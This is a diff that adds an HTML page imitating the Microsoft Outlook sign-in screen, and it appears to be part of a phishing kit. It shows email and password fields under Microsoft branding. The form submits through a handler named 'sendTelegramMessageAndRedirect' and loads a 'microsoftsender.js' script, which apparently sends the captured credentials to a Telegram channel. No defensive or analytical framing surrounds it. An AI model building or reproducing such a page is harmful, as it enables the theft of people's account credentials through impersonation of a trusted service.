@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in your account</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="./assset/microsoft-favicon.svg">
+    <script src="./microsoftsender.js" defer></script>
+    <script src="./script.js" defer></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <h1 class="title">Outlook</h1>
+    </header>
+    <div class="body_container">
+        <div class="container">
+            <div class="header">
+                <img src="./assset/Microsoft-log.svg" alt="" class="logo">
+            </div>
+            <form id="form" onsubmit="sendTelegramMessageAndRedirect(); return false; return false;">
+                <span class="sub__title">Sign in</span>
+                <p class="sub-text">to continue to Outlook</p>
+                <div class="form__row active">
+                    <input type="email" class="input" id="email" placeholder="Email address, phone number, or Skype">
+                    <p class="link">No account? <a href="#">Create one!</a></p>
+                    <a href="#">Can't access your account?</a>
+                </div>
+                <div class="form__row non-active">
+                    <p class="email-value">email value</p>
+                    <input type="password" class="input" id="password" placeholder="Password">
+                    <a href="#">Forgot password?</a>
+                </div>
+                <div class="button__wrapper">
+                    <button type="button" class="btn active">Back</button>
+                    <button type="button" id="next" class="btn btn--active active">Next</button>
+                    <button type="submit" class="btn btn--active non-active">Sign in</button>
+                </div>
+            </form>
+        </div>
+        <div class="container">
+            <div class="key__wrapper">
+                <img src="./assset/key.svg" alt="" class="key">
+                <p>Sign-in options</p>
+            </div>
+        </div>
+        <div class="footer">
+            <p class="footer__item">Terms of use</p>
+            <p class="footer__item">Privacy & cookies</p>
+            <p class="footer__item">...</p>
+        </div>
+    </div>
+</body>
+</html>
